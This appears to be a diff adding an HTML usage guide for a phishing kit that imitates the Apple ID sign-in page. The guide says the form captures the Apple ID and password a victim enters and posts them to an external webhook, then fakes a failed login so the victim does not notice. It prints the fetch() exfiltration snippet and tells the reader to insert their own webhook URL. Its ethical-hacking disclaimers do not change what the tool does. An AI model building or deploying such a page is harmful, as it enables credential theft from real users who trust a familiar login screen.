@@ -1,0 +1,41 @@
+ <div class="container">
+        <h1>Instructions for Apple ID Sign-In Page</h1>
+        <p>This document provides step-by-step instructions on how to use the Apple ID sign-in page for educational or instructional purposes. It is crucial to understand the legal and ethical implications of using such a page, especially in terms of cybersecurity and privacy.</p>
+
+        <h2>Purpose</h2>
+        <p>The Apple ID sign-in page is designed to replicate the look and feel of a genuine Apple login page. This is typically used to demonstrate phishing techniques in controlled, ethical hacking environments or cybersecurity courses. The main goal is to educate users about the dangers of phishing and how to protect themselves.</p>
+
+        <h2>Usage</h2>
+        <p>To use the page:</p>
+        <ol>
+            <li>Ensure you have a secure, controlled environment where this page will be used for demonstration or educational purposes only.</li>
+            <li>Open the provided HTML file in a web browser.</li>
+            <li>The page will display a form that asks for an Apple ID and password.</li>
+            <li>When the form is submitted, the entered credentials will be captured and sent to a specified webhook for logging purposes.</li>
+            <li>The page will simulate a failed login attempt, showing an error message and resetting the password field.</li>
+        </ol>
+
+        <h2>Legal and Ethical Considerations</h2>
+        <div class="note">
+            <p><strong>Important:</strong> This page should <strong>only</strong> be used in a controlled, ethical hacking environment, such as a cybersecurity class or a professional penetration testing scenario with proper authorization.</p>
+        </div>
+        <p>Phishing is illegal and unethical when done without the explicit consent of the individuals involved. Unauthorized use of this page to collect credentials or other personal information is a violation of privacy and can result in severe legal consequences. Always ensure that any testing is conducted in a legal and responsible manner, with full transparency and the necessary permissions.</p>
+
+        <h2>Modifying the Webhook URL</h2>
+        <p>If you need to change the webhook URL where the captured data is sent, locate the following section in the HTML code:</p>
+        <pre>
+fetch('WEBHOOK HERE', {
+    method: 'POST',
+    headers: {
+        'Content-Type': 'application/json',
+    },
+    body: JSON.stringify(data),
+});
+        </pre>
+        <p>Replace <code>WEBHOOK HERE</code> with your desired webhook URL.</p>
+
+        <h2>Conclusion</h2>
+        <p>This page is a powerful tool for demonstrating the risks of phishing, but it must be used responsibly. Always prioritize ethical considerations and legal compliance when using or distributing this page.</p>
+    </div>
+</body>
+</html>
